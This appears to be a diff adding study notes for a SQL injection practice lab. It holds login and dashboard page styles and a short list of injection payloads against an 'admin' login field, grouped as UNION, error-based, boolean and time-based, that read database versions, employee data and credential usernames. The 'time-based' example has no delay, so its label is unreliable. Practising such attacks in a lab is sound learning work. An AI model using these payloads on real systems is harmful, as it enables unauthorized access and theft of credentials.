@@ -1,0 +1,33 @@
+login:
+<style>
+        body { font-family: Arial, text-align: center; background: #e6f7ff; }
+        form { display: block; margin: 0 auto; padding: 20px; border: 2px solid #008080; background: #f0ffff; border-radius: 10px; width: fit-content; }
+        input, button { padding: 10px; border-radius: 5px; border: 1px solid #008080; width: 80%; margin: 10px 0; } button { background: #008080; color: white; cursor: pointer; } button:hover { background: #005757; }
+ </style>
+
+
+dashboard:
+    <style>
+        body { font-family: Arial; text-align: center; background: #f0f8ff; }
+        table, th, td { margin: 0 auto; border-collapse: collapse; padding: 12px; border: 1px solid #ddd; width: 80%; background: #f5f5f5; text-align: center; }
+        h1, a { color: #ff4500; } th { background: #4CAF50; color: white; } a:hover { text-decoration: underline; }
+    </style>
+
+
+
+*In-Band:*
+UNION:    	
+			admin' UNION SELECT null, sqlite_version(), null --                  
+			admin' UNION SELECT null, employee_name, role FROM employee_data --
+
+ERROR:
+			admin' AND 1=CONVERT(int, 'a') --
+
+*Inferential:*
+BOOLEAN:	
+			admin' AND 1=1 --
+			admin' AND (SELECT COUNT(*) FROM employee_credentials WHERE username='admin') > 0 --
+			admin' AND (SELECT SUBSTR(username, 1, 1) FROM employee_credentials WHERE username='admin') = 'a' --
+
+*Time-Based:*
+			admin' AND 1=(SELECT 1 FROM sqlite_master WHERE tbl_name LIKE '%') --
